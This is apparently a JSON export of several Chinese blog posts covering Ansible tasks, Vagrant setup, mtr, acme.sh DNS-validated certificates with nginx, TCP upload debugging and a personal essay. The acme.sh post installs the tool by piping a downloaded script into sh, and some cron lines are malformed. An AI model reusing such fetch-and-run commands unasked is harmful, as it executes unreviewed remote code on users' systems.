tasks是从上到下顺序执行，如果中间发生错误，那么整个playbook会中止。你可以改修文件后，再重新执行。 每一个task的对module的一次调用。使用不同的参数和变量而已。 每一个task最好有name属性，这个是供人读的，没有实际的操作。然后会在命令行里面输出，提示用户执行情况。 语法task的基本写法: tasks: - name: make sure apache is running service: name=httpd state=running其中name是可选的，也可以简写成下面的例子。 tasks: - service: name=httpd state=running - 写name的task在playbook执行时，会显示对应的名字，信息更友好、丰富。写name是个好习惯！ TASK: [make sure apache is running] ************************************************************* changed: [yourhost]没有写name的task在playbook执行时，直接显示对应的task语法。在调用同样的module多次后，不同意分辨执行到哪步了。 TASK: [service name=httpd state=running] ************************************** changed: [yourhost]参数的不同写法 最上的代码展示了最基本的传入module的参数的方法 key=value tasks: - name: make sure apache is running service: name=httpd state=running当需要传入参数列表太长时，可以分隔到多行： tasks: - name: Copy ansible inventory file to client copy: src=/etc/ansible/hosts dest=/etc/ansible/hosts owner=root group=root mode=0644或者用yml的字典传入参数 tasks: - name: Copy ansible inventory file to client copy: src: /etc/ansible/hosts dest: /etc/ansible/hosts owner: root group: root mode: 0644TASK的执行状态 task中每个action会调用一个module，在module中会去检查当前系统状态是否需要重新执行。如果本次执行了，那么action会得到返回值changed;如果不需要执行，那么action得到返回值okmodule的执行状态的具体判断规则由各个module自己决定和实现的。例如，”copy” module的判断方法是比较文件的checksum，代码如下：https://github.com/ansible/ansible-modules-core/blob/devel/files/copy.py 状态示例 以一个copy文件的task为例子: tasks: - name: Copy the /etc/hosts copy: src=/etc/hosts dest=/etc/hosts第一次执行,它的结果是这个样子的:TASK的状态是changed 第二次执行是下面这个样子的:TASK的状态是ok,由于第一次执行copy_hosts.yml的时候,已经拷贝过文件,那么ansible目标文件的状态避免重复执行. 下面我更改vm-rhel7-1的/etc/hosts, 再次执行看看: 变量参考https://ansible-book.gitbooks.io/ansible-first-book/content/advance/playbook/bian_liang.html","categories":[],"tags":[{"name":"ansible","slug":"ansible","permalink":"https://awen.me/tags/ansible/"}]},{"title":"mac vagrant 安装 Ubuntu 16.04","slug":"vagrant使用教程","date":"2017-06-30T04:52:09.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/3166325559.html","link":"","permalink":"https://awen.me/posts/3166325559.html","excerpt":"什么是 vagrantVagrant 是一款用来构建虚拟开发环境的工具，非常适合 php/python/ruby/java 这类语言开发 web 应用，”代码在我机子上运行没有问题”这种说辞将成为历史。 安装 需要安装 virtualbox 和 vagrant virtualbox 官网 https://www.virtualbox.org/vagrant 官网https://www.vagrantup.com/","text":"什么是 vagrantVagrant 是一款用来构建虚拟开发环境的工具，非常适合 php/python/ruby/java 这类语言开发 web 应用，”代码在我机子上运行没有问题”这种说辞将成为历史。 安装 需要安装 virtualbox 和 vagrant virtualbox 官网 https://www.virtualbox.org/vagrant 官网https://www.vagrantup.com/ 安装镜像➜ mkdir ~/dev # 创建一个开发目录 ➜ dev cd ~/dev #进入到目录 ➜ dev vagrant box add ubuntu/xenial64 # 下载 Ubuntu 镜像 ➜ dev vagrant up ➜ dev vagrant ssh 常用命令$ vagrant init # 初始化 $ vagrant up # 启动虚拟机 $ vagrant halt # 关闭虚拟机 $ vagrant reload # 重启虚拟机 $ vagrant ssh # SSH 至虚拟机 $ vagrant status # 查看虚拟机运行状态 $ vagrant destroy # 销毁当前虚拟机增加内存和 cpu➜ dev vim Vagrantfile1.添加 Vagrant.configure(2) do |config| config.vm.box = &quot;ubuntu/xenial64&quot; config.vm.provider &quot;virtualbox&quot; do |vb| # # Display the VirtualBox GUI when booting the machine # vb.gui = true # # # Customize the amount of memory on the VM: vb.memory = &quot;1524&quot; endend然后 ➜ dev vagrant reload删除镜像➜ ~ vagrant box list base (virtualbox, 0) hashicorp/precise64 (virtualbox, 1.1.0) ubuntu/trusty64 (virtualbox, 20170619.0.0) ➜ ~ vagrant box remove hashicorp/precise64 Removing box &apos;hashicorp/precise64&apos; (v1.1.0) with provider &apos;virtualbox&apos;... ➜ ~ vagrant box remove ubuntu/trusty64 Removing box &apos;ubuntu/trusty64&apos; (v20170619.0.0) with provider &apos;virtualbox&apos;...Vagrantfile配置文件详解在我们的开发目录下有一个文件Vagrantfile，里面包含有大量的配置信息，主要包括三个方面的配置，虚拟机的配置、SSH配置、Vagrant的一些基础配置。Vagrant是使用Ruby开发的，所以它的配置语法也是Ruby的，但是我们没有学过Ruby的人还是可以跟着它的注释知道怎么配置一些基本项的配置。 1.box设置 config.vm.box = &quot;base&quot;上面这配置展示了Vagrant要去启用那个box作为系统，也就是上面我们输入vagrant init Box名称时所指定的box，如果沒有输入box名称的話，那么默认就是base，VirtualBox提供了VBoxManage这个命令行工具，可以让我们设定VM，用modifyvm这个命令让我们可以设定VM的名称和内存大小等等，这里说的名称指的是在VirtualBox中显示的名称，我们也可以在Vagrantfile中进行设定，在Vagrantfile中加入如下这行就可以设定了： config.vm.provider &quot;virtualbox&quot; do |v| v.customize [&quot;modifyvm&quot;, :id, &quot;--name&quot;, &quot;astaxie&quot;, &quot;--memory&quot;, &quot;512&quot;] end这行设置的意思是调用VBoxManage的modifyvm的命令，设置VM的名称为astaxie，内存为512MB。你可以类似的通过定制其它VM属性来定制你自己的VM。 2.网络设置 Vagrant有两种方式来进行网络连接，一种是host-only(主机模式)，意思是主机和虚拟机之间的网络互访，而不是虚拟机访问internet的技术，也就是只有你一個人自High，其他人访问不到你的虚拟机。另一种是Bridge(桥接模式)，该模式下的VM就像是局域网中的一台独立的主机，也就是说需要VM到你的路由器要IP，这样的话局域网里面其他机器就可以访问它了，一般我们设置虚拟机都是自high为主，所以我们的设置一般如下： config.vm.network :private_network, ip: &quot;192.168.33.10&quot;这里我们虚拟机设置为hostonly，并且指定了一个IP，IP的话建议最好不要用192.168..这个网段，因为很有可能和你局域网里面的其它机器IP冲突，所以最好使用类似11.11..这样的IP地址。 3.hostname设置 hostname的设置非常简单，Vagrantfile中加入下面这行就可以了： config.vm.hostname = &quot;go-app&quot;设置hostname非常重要，因为当我们有很多台虚拟服务器的时候，都是依靠hostname來做识别的，例如Puppet或是Chef，都是通过hostname來做识别的，既然设置那么简单，所以我们就別偷懒，设置一个。 4.同步目录 我们上面介绍过/vagrant目录默认就是当前的开发目录，这是在虚拟机开启的时候默认挂载同步的。我们还可以通过配置来设置额外的同步目录： config.vm.synced_folder &quot;/Users/astaxie/data&quot;, &quot;/vagrant_data&quot;上面这个设定，第一个参数是主机的目录，第二个参数是虚拟机挂载的目录 5.端口转发 config.vm.network :forwarded_port, guest: 80, host: 8080上面这句配置可厉害了，这一行的意思是把对host机器上8080端口的访问请求forward到虚拟机的80端口的服务上，例如你在你的虚拟机上使用nginx跑了一个Go应用，那么你在host机器上的浏览器中打开http://localhost:8080 时，Vagrant就会把这个请求转发到VM里面跑在80端口的nginx服务上，因此我们可以通过这个设置来帮助我们去设定host和VM之间，或是VM和VM之间的信息交互。 修改完Vagrantfile的配置后，记得要用vagrant reload命令来重启VM之后才能使用VM更新后的配置 测试1.发现 IP 变成了192.168.33.10 2.在虚拟机中我们看到根目录有一个vagrant 目录。我们切进去，创建一个目录，比如 www ubuntu@ubuntu-xenial:/$ ls bin dev home initrd.img.old lib64 media opt root sbin srv tmp vagrant vmlinuz boot etc initrd.img lib lost+found mnt proc run snap sys usr var vmlinuz.old ubuntu@ubuntu-xenial:/$ cd vagrant/ ubuntu@ubuntu-xenial:/vagrant$ ls Vagrantfile ubuntu@ubuntu-xenial:/vagrant$ mkdir www ubuntu@ubuntu-xenial:/vagrant$ ls Vagrantfile www ubuntu@ubuntu-xenial:/vagrant$3.然后，宿主机的目录下就有了一个 www ➜ ~ cd ~/dev/ ➜ dev ls Vagrantfile www4.修改 nginx 的web 目录指向/vagrant/www/，然后重启 nginx server { listen 80 default_server; #listen [::]:80 default_server ipv6only=on; server_name _; index index.html index.htm index.php; root /vagrant/www/;5.在宿主机写一个测试文件吧 6.输入IP，就可以访问了，以后本地写代码，直接就可以虚拟机实时运行了 打包 box➜ ~ vagrant package --base dev_default_1498810341196_30650 --output dev.box 注意这个–base 指定的是虚拟机的名称","categories":[],"tags":[]},{"title":"mac安装mtr","slug":"mac安装mtr","date":"2017-06-27T09:26:14.000Z","updated":"2021-02-26T06:05:29.278Z","comments":true,"path":"posts/369757448.html","link":"","permalink":"https://awen.me/posts/369757448.html","excerpt":"下载1.去这里下载对应软件包http://rudix.org/packages/mtr.html","text":"下载1.去这里下载对应软件包http://rudix.org/packages/mtr.html 设备别名alias mtr=/usr/local/sbin/mtr 运行sudo mtr v0.api.upyun.com","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"使用验证DNS的方式申请证书","slug":"使用验证DNS的方式申请证书","date":"2017-06-27T08:43:00.000Z","updated":"2021-02-26T06:05:29.312Z","comments":true,"path":"posts/248023261.html","link":"","permalink":"https://awen.me/posts/248023261.html","excerpt":"如果说你的网站要使用Let’s encrypt的话，当你无法使用A记录的方式添加 @和 www 时，而使用了 cname 记录添加，这种情况一般发生在使用 CDN 加速域名的时候会出现，例如你要加速 fangwenjun.com 和 www.fangwenjun.com 当你的源站也443端口加上证书也是采用的Let’s encrypt，就不能自动续期证书的，因为Let’s encrypt必须验证主域名的所有者，也就是说必须做 A 记录指向才可以申请和续签，而使用 CDN 一般得到的 IP 地址都是 CDN 厂商的代理 IP，并非你的真实 IP，这样就会导致升级续签会很麻烦，你不能享受Let’s encrypt的自动续签功能，做了计划任务到期续签，当你的源站证书到期后，你不得不修改 DNS 解析指向源站做 A 记录才能升级，否则超过90天源站的证书就会过期。 但是，在 GitHub 上我发现一个项目，叫 acme,项目地址https://github.com/Neilpang/acme.sh，它是一个开源的项目，其实就是一个 sh 脚本，，它的强大之处就在于你即使是在你的本地 PC 上，同样可以申请Let’s encrypt证书，并且支持 DNS 的方式申请，而不占用你的 cname 和 A 记录，这样，哪怕你使用了 CDN 进行加速，也不必担心源站证书续签的问题，下面就简单演示下如何通过 DNS 的方式申请证书。","text":"如果说你的网站要使用Let’s encrypt的话，当你无法使用A记录的方式添加 @和 www 时，而使用了 cname 记录添加，这种情况一般发生在使用 CDN 加速域名的时候会出现，例如你要加速 fangwenjun.com 和 www.fangwenjun.com 当你的源站也443端口加上证书也是采用的Let’s encrypt，就不能自动续期证书的，因为Let’s encrypt必须验证主域名的所有者，也就是说必须做 A 记录指向才可以申请和续签，而使用 CDN 一般得到的 IP 地址都是 CDN 厂商的代理 IP，并非你的真实 IP，这样就会导致升级续签会很麻烦，你不能享受Let’s encrypt的自动续签功能，做了计划任务到期续签，当你的源站证书到期后，你不得不修改 DNS 解析指向源站做 A 记录才能升级，否则超过90天源站的证书就会过期。 但是，在 GitHub 上我发现一个项目，叫 acme,项目地址https://github.com/Neilpang/acme.sh，它是一个开源的项目，其实就是一个 sh 脚本，，它的强大之处就在于你即使是在你的本地 PC 上，同样可以申请Let’s encrypt证书，并且支持 DNS 的方式申请，而不占用你的 cname 和 A 记录，这样，哪怕你使用了 CDN 进行加速，也不必担心源站证书续签的问题，下面就简单演示下如何通过 DNS 的方式申请证书。 下载 acmewget -O - https://get.acme.sh | sh脚本会自动安装，并且将文件安装在当前用户的主目录下 ~/.acme.sh/ 中，在这个目录中有一个 acme.sh 的文件，我们就是需要通过他来进行域名的申请。 设置别名为了方便操作，我们设置下别名。 alias acme=&quot;~/.acme.sh/acme.sh&quot;你也可以把别名写在/etc/profile中或者/.bashrc中（根据你使用的shell来决定，比如我使用的是zsh,那么就是/.zshrc） 使用 DNS 的方式生成证书好了下面我们开始了，我们使用 acme.sh --issue --dns -d domain.com 的方式来生成一个针对所申请域名的 TXT 解析记录和值，这样的目的是需要验证这个域名的的所有者是你本人，他会把这些信息保存在你的本地，后续不需要重复设置。 ➜ .acme.sh acme.sh --issue --dns -d fangwenjun.com -d www.fangwenjun.com -d file.fangwenjun.com [2017年 3月14日 星期二 22时56分55秒 CST] Registering account [2017年 3月14日 星期二 22时57分03秒 CST] Registered [2017年 3月14日 星期二 22时57分07秒 CST] Update success. [2017年 3月14日 星期二 22时57分08秒 CST] ACCOUNT_THUMBPRINT=&apos;rtbrvOIhfSlomTtv1gUBS5ZByg9ORLs5bwl-ch1FK8Q&apos; [2017年 3月14日 星期二 22时57分08秒 CST] Creating domain key [2017年 3月14日 星期二 22时57分08秒 CST] Multi domain=&apos;DNS:www.fangwenjun.com,DNS:file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分08秒 CST] Getting domain auth token for each domain [2017年 3月14日 星期二 22时57分08秒 CST] Getting webroot for domain=&apos;fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分08秒 CST] Getting new-authz for domain=&apos;fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分11秒 CST] The new-authz request is ok. [2017年 3月14日 星期二 22时57分11秒 CST] Getting webroot for domain=&apos;www.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分11秒 CST] Getting new-authz for domain=&apos;www.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分15秒 CST] The new-authz request is ok. [2017年 3月14日 星期二 22时57分15秒 CST] Getting webroot for domain=&apos;file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分15秒 CST] Getting new-authz for domain=&apos;file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] The new-authz request is ok. [2017年 3月14日 星期二 22时57分18秒 CST] Add the following TXT record: [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;wfcx_c5Gy-ru9DD3M4R8WtJs1tH_bxcSTMEZctdWpFM&apos; [2017年 3月14日 星期二 22时57分18秒 CST] Please be aware that you prepend _acme-challenge. before your domain [2017年 3月14日 星期二 22时57分18秒 CST] so the resulting subdomain will be: _acme-challenge.fangwenjun.com [2017年 3月14日 星期二 22时57分18秒 CST] Add the following TXT record: [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.www.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;jAsFVqh5S1fU9VsaNm0rAdG47AEsEAZVQwSoVtkUXzs&apos; [2017年 3月14日 星期二 22时57分18秒 CST] Please be aware that you prepend _acme-challenge. before your domain [2017年 3月14日 星期二 22时57分18秒 CST] so the resulting subdomain will be: _acme-challenge.www.fangwenjun.com [2017年 3月14日 星期二 22时57分18秒 CST] Add the following TXT record: [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;TAevmR4OZVbvqkGmc98hLq1mOJGA7_z29BMxa7BcIOI&apos; [2017年 3月14日 星期二 22时57分18秒 CST] Please be aware that you prepend _acme-challenge. before your domain [2017年 3月14日 星期二 22时57分18秒 CST] so the resulting subdomain will be: _acme-challenge.file.fangwenjun.com [2017年 3月14日 星期二 22时57分18秒 CST] Please add the TXT records to the domains, and retry again. [2017年 3月14日 星期二 22时57分18秒 CST] Please add &apos;--debug&apos; or &apos;--log&apos; to check more details. [2017年 3月14日 星期二 22时57分18秒 CST] See: https://github.com/Neilpang/acme.sh/wiki/How-to-debug-acme.sh 设置 TXT，将你所得到的记录值和地址添加到域名解析中（这里只是演示，没有把www.fangwenjun.com和 file.fangwenjun.com的 TXT 值都添加，后面会造成申请这两个证书会失败）。 然后我们需要验证域名解析是否成功，验证 TXT 我们需要使用 dig domain -t TXT 然后我们可以申请证书了 ➜ .acme.sh acme.sh --renew -d fangwenjun.com -d www.fangwenjun.com -d file.fangwenjun.com [2017年 3月14日 星期二 22时59分47秒 CST] Renew: &apos;fangwenjun.com&apos; [2017年 3月14日 星期二 22时59分47秒 CST] Multi domain=&apos;DNS:www.fangwenjun.com,DNS:file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时59分47秒 CST] Getting domain auth token for each domain [2017年 3月14日 星期二 22时59分47秒 CST] Verifying:fangwenjun.com [2017年 3月14日 星期二 23时00分01秒 CST] Success [2017年 3月14日 星期二 23时00分01秒 CST] Verifying:www.fangwenjun.com [2017年 3月14日 星期二 23时00分12秒 CST] www.fangwenjun.com:Verify error:DNS problem: NXDOMAIN looking up TXT for _acme-challenge.www.fangwenjun.com [2017年 3月14日 星期二 23时00分12秒 CST] Please add &apos;--debug&apos; or &apos;--log&apos; to check more details. [2017年 3月14日 星期二 23时00分12秒 CST] See: https://github.com/Neilpang/acme.sh/wiki/How-to-debug-acme.sh提示 Succes 则表示成功了，下面的报错www.fangwenjun.com:Verify error:DNS problem: NXDOMAIN looking up TXT for _acme-challenge.www.fangwenjun.com中之所以失败，是因为当添加多个域名时候，必须要把每个 txt 记录都添加上,比如我要申请的域名fangwenjun.com、 www.fangwenjun.com、file.fangwenjun.com，这个时候你需要根据上面的提示添加 [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;wfcx_c5Gy-ru9DD3M4R8WtJs1tH_bxcSTMEZctdWpFM&apos;在域名fangwenjun.com下添加主机记录为_acme-challenge，记录值为wfcx_c5Gy-ru9DD3M4R8WtJs1tH_bxcSTMEZctdWpFM，类型选择TXT。 [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.www.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;jAsFVqh5S1fU9VsaNm0rAdG47AEsEAZVQwSoVtkUXzs&apos;在域名fangwenjun.com下添加主机记录为_acme-challenge.www，记录值为jAsFVqh5S1fU9VsaNm0rAdG47AEsEAZVQwSoVtkUXzs，类型选择TXT。 [2017年 3月14日 星期二 22时57分18秒 CST] Domain: &apos;_acme-challenge.file.fangwenjun.com&apos; [2017年 3月14日 星期二 22时57分18秒 CST] TXT value: &apos;TAevmR4OZVbvqkGmc98hLq1mOJGA7_z29BMxa7BcIOI&apos;在域名fangwenjun.com下添加主机记录为_acme-challenge.file，记录值为TAevmR4OZVbvqkGmc98hLq1mOJGA7_z29BMxa7BcIOI，类型选择TXT。 以此类推，你需要几个ssl域名就添加几条TXT记录，注意不要复制错。 最后，申请的证书在~/acme.sh目录下 ➜ .acme.sh ls account.conf acme.sh acme.sh.env ca deploy dnsapi fangwenjun.com http.header ➜ .acme.sh cd fangwenjun.com ➜ fangwenjun.com ls fangwenjun.com.conf fangwenjun.com.csr fangwenjun.com.csr.conf fangwenjun.com.key配置nginx1.在nginx的路径中创建一个ssl目录，并赋予其nginx进程的访问权限 mkdir -p /usr/local/nginx/ssl &amp;&amp; chown -R www:www /usr/local/nginx/ssl2.然后，在/usr/bin目录下创建一个脚本updatessl，内容如下 #!/bin/bash /root/.acme.sh/acme.sh --installcert -d fangwenjun.com --keypath /usr/local/nginx/ssl/fangwenjun.com.key --fullchainpath /usr/local/nginx/ssl/fangwenjun.com.cer --reloadcmd &quot;/etc/init.d/nginx restart&quot;3.赋予其可执行权限 chmod +x /usr/bin/updatessl4.将其加入到计划任务中 0 8 * 1 * root &quot;/usr/bin/updatessl &gt; /dev/null5.在你的nginx.conf或虚拟主机的配置文件中找到修改证书的路径 server{ listen 443 ssl http2 default_server; server_name www.fangwenjun.com fangwenjun.com; index index.html index.htm index.php; root /home/wwwroot/default; ssl on; ssl_certificate /usr/local/nginx/ssl/fangwenjun.com.cer; ssl_certificate_key /usr/local/nginx/ssl/fangwenjun.com.key; }如希望80端口访问也跳到https 去，可以在加一个 server，使用 rewrite 进行跳转。 server { listen 80 default_server; server_name www.fangwenjun.com fangwenjun.com; rewrite ^(.*)$ https://$host$1 permanent; }自动更新acme会自动加入一条计划任务，你可以使用crontab -e 查看 0 2 14 * * `/root/.acme.sh&quot;/acme.sh --cron --home &quot;/root/.acme.sh&quot; &gt; /dev/null` 0 3 14 * * root `/usr/bin/updatessl &gt; /dev/null` 以上操作后，每14天的凌晨2点会更新acme和续签证书 /root/.acme.sh --renew-all --force，然后14天的3点会把续签好的证书拷贝到nginx的ssl目录中并重启nginx。","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"}]},{"title":"上传文件 Empty reply from server","slug":"上传文件失败抓包分析","date":"2017-06-27T07:11:34.000Z","updated":"2021-02-26T06:05:29.296Z","comments":true,"path":"posts/603913889.html","link":"","permalink":"https://awen.me/posts/603913889.html","excerpt":"某客户返回海外上传文件特别慢，经常超时，于是进行排查 往接口发送文件在 digitalocean 创建一个英国的服务器，然后进行测试 1.本地上传一个53k 的文件 root@ubuntu-512mb-lon1-01:~# curl -T /usr/bin/passwd http://v0.api.upyun.com/file201503/passwd -u fangwenjun:xxxxxx-v * Trying 43.230.89.190... * Connected to v0.api.upyun.com (43.230.89.190) port 80 (#0) * Server auth using Basic with user &apos;fangwenjun&apos; &gt; PUT /file201503/passwd HTTP/1.1 &gt; Host: v0.api.upyun.com &gt; Authorization: Basic xxxxx== &gt; User-Agent: curl/7.47.0 &gt; Accept: */* &gt; Content-Length: 54256 &gt; Expect: 100-continue &gt; &lt; HTTP/1.1 100 Continue * We are completely uploaded and fine * Empty reply from server * Connection #0 to host v0.api.upyun.com left intact curl: (52) Empty reply from server","text":"某客户返回海外上传文件特别慢，经常超时，于是进行排查 往接口发送文件在 digitalocean 创建一个英国的服务器，然后进行测试 1.本地上传一个53k 的文件 root@ubuntu-512mb-lon1-01:~# curl -T /usr/bin/passwd http://v0.api.upyun.com/file201503/passwd -u fangwenjun:xxxxxx-v * Trying 43.230.89.190... * Connected to v0.api.upyun.com (43.230.89.190) port 80 (#0) * Server auth using Basic with user &apos;fangwenjun&apos; &gt; PUT /file201503/passwd HTTP/1.1 &gt; Host: v0.api.upyun.com &gt; Authorization: Basic xxxxx== &gt; User-Agent: curl/7.47.0 &gt; Accept: */* &gt; Content-Length: 54256 &gt; Expect: 100-continue &gt; &lt; HTTP/1.1 100 Continue * We are completely uploaded and fine * Empty reply from server * Connection #0 to host v0.api.upyun.com left intact curl: (52) Empty reply from server 同时抓包 root@ubuntu-512mb-lon1-01:~# tcpdump -i eth0 -nnXSs 0 &apos;host 43.230.89.190 and port 80&apos; -w 3.cap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes发现往43.230.89.190发送 PUT 请求时出现Empty reply from server 本地测试路由 发现 ae-13.r30.tokyjp05.jp.bb.gin.ntt.net 52.9% 34 220.5 220.4 219.3 225.5 1.5丢包率很大。 pingroot@ubuntu-512mb-lon1-01:~# ping 43.230.89.190 PING 43.230.89.190 (43.230.89.190) 56(84) bytes of data. 64 bytes from 43.230.89.190: icmp_seq=1 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=2 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=3 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=4 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=5 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=6 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=7 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=8 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=9 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=10 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=11 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=12 ttl=46 time=279 ms 64 bytes from 43.230.89.190: icmp_seq=13 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=14 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=15 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=16 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=17 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=18 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=19 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=20 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=21 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=22 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=23 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=24 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=25 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=26 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=27 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=28 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=29 ttl=46 time=275 ms 64 bytes from 43.230.89.190: icmp_seq=30 ttl=46 time=275 ms ^C --- 43.230.89.190 ping statistics --- 31 packets transmitted, 30 received, 3% packet loss, time 30044ms rtt min/avg/max/mdev = 275.387/275.678/279.776/1.025 ms 有点丢包，不过没超时的 数据包分析 发现大量TCP segment of a reassembled PDU wireshark 常见 tcp 报错1.TCP previous segment lost (tcp先前的分片丢失）到达分组中的序列号高于下一期望的序列号，指示至少一个段被丢弃/丢失。接收站通过针对其接收的每个附加分组发送重复ACK来纠正这种情况，直到发送方重传丢失的分组为止。 2.TCP acked lost segment（tcp应答丢失）发送方发送了报文之后等待接收方给出ACK应答，在规定的等待时间内没有收到接收方的ACK会提示该信息。 3.TCP window update（tcp窗口更新）TCP Window Update 是TCP通信中的一个状态，它可以发生的原因有很多，但最终归结于发送者传输数据的速度比接收者读取的数据还快，这使得接收端的在缓冲区必须释放一部分空间来装发送过来的数据，然后向发送者发送Windows Update，告诉给发送者应该以多大的速度发送数据，从而使得数据传输与接受恢复正常。 4.TCP dup ack（tcp重复应答）Tcp Dup Ack xxx#y 代表了数据段丢失TCP状态，xxx代表数据丢失的位置，#后代表第几次丢失文。 一般来说是网络拥塞导致丢包，比如发送方的报文到达不了接收方，接受方收不到预期序列号的报文就会发送dup ack给发送方，发送方收到3个dup ack就会快速重传而不必等超时定时器。 一般来说是网络拥塞导致丢包，比如发送方的报文到达不了接收方，接受方收不到预期序列号的报文就会发送dup ack给发送方，发送方收到3个dup ack就会快速重传而不必等超时定时器。 5.TCP keep alive（tcp保持活动）Keep-alive的机制可以检测死连接，TCP会在空闲了一定时间后发送数据给对方： 如果主机可达，对方就会响应ACK应答，就认为是存活的。如果可达，但应用程序退出，对方就发RST应答，发送TCP撤消连接。 如果可达，但应用程序崩溃，对方就发FIN消息。 如果对方主机不响应ack, rst，继续发送直到超时，就撤消连接。这个时间默认是2小时。 6.TCP retransmission（tcp重传） 7.TCP port numbers reused（tcp端口重复使用）TCP协议中规定，处在 TIME-WAIT 状态的TCP端，必须等待一定时长（协议建议2MSL），尽量确保TCP远端能够收到最后一次FIN分段的ACK确认。处于TIME-WAIT状态的TCP端，不能重建以同一四元组标识的TCP替身连接。该提示是由于客服端重新建立连接的端口号使用了仍然处在2MSL等待时长内的端口号 8.TCP fast retransmission (tcp快速重传)TCP层检测到拥塞发生一般是两个条件之一，超时或者dup ack。 dup ack三次之后就进入快速重传/快速恢复 or 快速重传/慢启动 9.TCP spurious retransmission(tcp伪重传)该提示是由于发送端重发了一个已经收到应答的报文段导致。 10.TCP segment of a reassembled PDU (重新组装的PDU的TCP片段)TCP层收到上层大块报文后分解成段后发出去。 收到一个报文后如何确定它是一个”TCP segment”？如果有几个报文的ACK序号都一样，并且这些报文的Sequence Number都不一样，并且后一个Sequence Number为前一个Sequence Number加上前一个报文大小再加上1的话，肯定是TCP segment了，对于没有ACK标志时，则无法判断。","categories":[],"tags":[]},{"title":"见识决定命运","slug":"见识决定命运","date":"2017-06-26T22:25:32.000Z","updated":"2021-02-26T06:05:29.356Z","comments":true,"path":"posts/29912.html","link":"","permalink":"https://awen.me/posts/29912.html","excerpt":"这句话我是深有感触，罗辑思维之前有一期叫“拒绝逃离北上广，见识决定命运” 里面几个例子印象深刻，虽然现在的罗辑思维节目我不怎么看了。","text":"这句话我是深有感触，罗辑思维之前有一期叫“拒绝逃离北上广，见识决定命运” 里面几个例子印象深刻，虽然现在的罗辑思维节目我不怎么看了。 里面说的两农民聊天，一农民吹牛说，我见皇上金銮殿，那个说金銮殿什么样啊？说金銮殿啊？！那好！左边一个油条铺子，右边一个烧饼铺子，皇下想下来吃哪个就吃那个，都不给钱的！ 在一个农民能够想象的，世界上最好的生活就那样的。 一个捡粪的，坐路边上叹气说，他妈的，我要是当了皇上，这捡粪的叉子得是金的，而且我要路两边的粪都归我一个人捡！ 然后打倒四人帮之后，民间有说江青腐败，那老婆娘那不是东西，对吧，说，床头搁着一红糖罐子，床尾搁一白糖罐子，夜里起来都吃！窝嚓。 其实在几年前，也就14年初吧，在此之前这二十多年，我就感觉我是被贫穷束缚着，勉强上个大学，见识如同井底之蛙，这一切的根源其实还是要归结于家里贫穷。 在农村生活了十几年，到了初中毕业我才进过县城，在此之前我根本没有离开过方圆几十里地，最远的路程大概也就是小学学校组织到邻村的革命英雄纪念碑扫墓。那时候还没有修柏油路，交通闭塞，我家四面环山，山路崎岖，一天就2趟班车（现在变3趟）进城。 我的眼界被限定在这一片范围之内，每天的任务就是完成学校布置的作业，日常活动就是玩泥巴、周末打弹珠，然后家里养了头牛，放学或周末早上要去放牛，农忙时要帮家里采茶啊、锄地。 说实话，这种生活枯燥无味，但是已经习惯且变得麻木了。 直到初中毕业我才进了县城，那已经是16岁了，感觉像是发现了新天地，眼界被限制在不超过县城学校附近20公里地的地方。 